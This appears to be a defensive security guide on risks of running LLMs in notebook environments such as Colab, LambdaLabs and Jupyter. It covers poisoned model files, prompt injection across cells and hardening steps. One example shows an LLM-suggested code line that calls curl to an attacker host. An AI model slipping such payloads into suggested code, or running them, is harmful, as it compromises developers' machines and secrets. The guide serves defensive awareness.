# Local Dev: Colab, LambdaLabs, Notebooks

Local Dev: Colab, LambdaLabs, Notebooks

Running LLMs on local infrastructure — like Jupyter Notebooks, Colab, Lambda Labs GPUs, or desktop setups — gives flexibility and privacy, but also exposes **developer-facing attack surfaces** that are often overlooked in production-grade defenses.

## Common Local LLM Environments

| Platform         | Description                               |
| ---------------- | ----------------------------------------- |
| Google Colab     | Browser-based Jupyter environment         |
| LambdaLabs       | Dedicated GPU VMs for AI workloads        |
| Paperspace       | Cloud-hosted dev instances with notebooks |
| Local Jupyter    | Self-hosted Python notebooks or VSCode    |
| Modal, Replicate | Function-as-a-Service inference platforms |

## Primary Risks

### 1. Notebook Execution Exploits

* LLM output injected into code cell
* Auto-eval or `%load` triggers command execution
* Memory-based prompt injection across cells

### 2. GPU-Enabled RCE

* LLMs running with elevated permissions (e.g., CUDA access)
* Poisoned `.pt` or `.pkl` files loaded directly
* Kernel persistence via memory allocation

### 3. Cross-Cell Prompt Injection

* User copies LLM-generated code to new cell
*   LLM response includes obfuscated payload:

    ```python
    # try this:
    import os; os.system('curl attacker.com')  # helpful!
    ```

### 4. Notebook Sharing

* Public Colab links or `.ipynb` files with embedded backdoors
* Markdown cells that include malicious JavaScript or code via `%run`

### 5. Colab-Specific Issues

* Hidden runtime reuse across tabs
* API keys stored in variables or environment
* Output history includes secrets or logs

## Jupyter Log Leak Example

Until v6.4.9, Jupyter logged full HTTP headers (including cookies) to local logs:

```
/home/user/.local/share/jupyter/runtime/jupyter-server.log
```

🛑 Local attacker could monitor for auth tokens from 5xx error logs.

## Real-World Attack Patterns

| Vector                     | Example                                    |
| -------------------------- | ------------------------------------------ |
| Code suggestion injection  | LLM injects payload in output string       |
| Markdown → Code transition | Payload embedded in narrative explanations |
| Shared notebook cloning    | Inherits unsafe model weights or imports   |

## Hardening Local Dev Environments

| Layer             | Strategy                                     |
| ----------------- | -------------------------------------------- |
| Output Filtering  | Scan LLM completions for dangerous code      |
| Notebook Signing  | Use verified `.ipynb` signatures             |
| Kernel Isolation  | Run in Docker / VM with restricted access    |
| Log Sanitization  | Remove auth tokens from console and logs     |
| Disable Auto-Eval | Never eval() or exec() untrusted completions |

## Best Practices for Notebook Safety

* Never copy-paste LLM output into trusted environments
* Use linting + sandbox tools to check completions
* Scrub notebook metadata before sharing

## Summary

The dev environment is the new endpoint.\
An LLM that helps you write code can also help attackers write **your code** — into your own tools.
